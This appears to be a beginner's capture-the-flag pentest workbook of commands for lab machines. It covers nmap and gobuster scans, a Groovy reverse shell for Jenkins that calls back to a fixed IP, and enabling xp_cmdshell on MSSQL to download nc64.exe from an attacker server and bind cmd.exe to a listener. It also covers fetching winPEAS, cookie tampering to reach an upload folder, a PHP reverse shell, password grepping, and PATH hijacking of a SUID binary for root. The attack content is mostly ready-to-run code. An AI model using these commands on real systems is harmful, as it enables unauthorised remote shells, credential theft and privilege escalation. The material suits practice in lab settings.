#Beginner Pentest Workbook
##Capture the Flag (most common steps, getting started)

#NMAP

nmap -sC -sV {TARGET}
nmap -sC -Pn {TARGET} -- no host discovery


#GOBUSTER

gobuster dir --url {TARGET} --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html

#Jenkins

##Groovy Reverse Shell

String host="10.10.15.80";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(), so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); 


#Netcat cmd to listen to the port

nc -lvnp 8000

#SMB - Server machine block

smbclient -L {TARGET} -U Administrator
List the directories

smbclient \\\\{TARGET}\\{DIR} -U Administrator

Access the dir.

smbclient -N -L \\\\{TARGET_IP}\\
-N : No password
-L : This option allows you to look at what services are available on a server


#Impacket

##mssqlclient.py

python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth

prompt the password we discovered

C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline>console history


python3 psexec.py administrator@{TARGET}
connect to admin account > password needed

###Useful links

https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

##Commands to allow xp_cmdshell on Windows server

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

SQL> xp_cmdshell "whoami"

###Run this on your attacker machine

http.server to upload the netcat executable:
sudo python3 -m http.server 80

netcat on another tty to listen
sudo nc -lvnp 443

###Useful link
https://github.com/int0x33/nc.exe/blob/master/nc64.exe

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads"

xp_cmdshell "powershell -c pwd"

wget to get on your attacker VM the nc64 executable
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{YOUR_IP}/nc64.exe -outfile nc64.exe"

Now, we can bind the cmd.exe through the nc to our listener:
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {YOUR_IP} 443"


#winPEAS

###Useful link

https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe

On your attacker machine:
python3 -m http.server 80

On the target machine 

powershell
wget http://{YOUR_IP}/winPEASx64.exe -outfile winPEASx64.exe


#Information Disclosure -- Cookies

Example:

http://{TARGET}/cdn-cgi/login/admin.php?content=accounts&id= {CHANGE ID to test for some Info gathering}

Change cookie, example:

role => admin
id => 34322

So we get the access to upload folder

nc -lvnp {PORT} -- port we set on the reverse shell

http://{target}/uploads/php-reverseshell.php

Functional shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

###Common paths

You need to be used to Linux so try to find more privileged users who you can exploit and escalate privileges.
Example we find user jason, so we try to find a way to get into it

su jason > it will prompt you to type the password,
cat * | grep -i passw*
try to find anything useful as passwd or passwords, no case sensitive -i flag on grep will get Password or anything like this.

id
uid=1000(jason) gid=1000(jason) groups=1000(jason),1001(bugtracker)

find / -group bugtracker 2>/dev/null
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

this file has a SUID > root

SUID 

SUID (Set owner User ID), the special permission for the user access
level has a single function: A file with SUID always executes as the user who owns the
file, regardless of the user passing the command. If the file owner doesn't have
execute permissions, then use an uppercase S here.

####Let's try to exploit it

bugtracker 
> prompts you to type bug ID
try anything,
it will get you the error:

cat: /root/reports/12: No such file or directory

So, it is using the command cat to fetch files

This is exploitable

cd /tmp
echo "/bin/sh" > cat
chmod +x cat
export PATH=/tmp:$PATH

NB: put /tmp before $PATH so the shell will search for cat on our directory first

now execute bugtracker and type: anything on the prompt

you will get inside the /bin/sh as root.
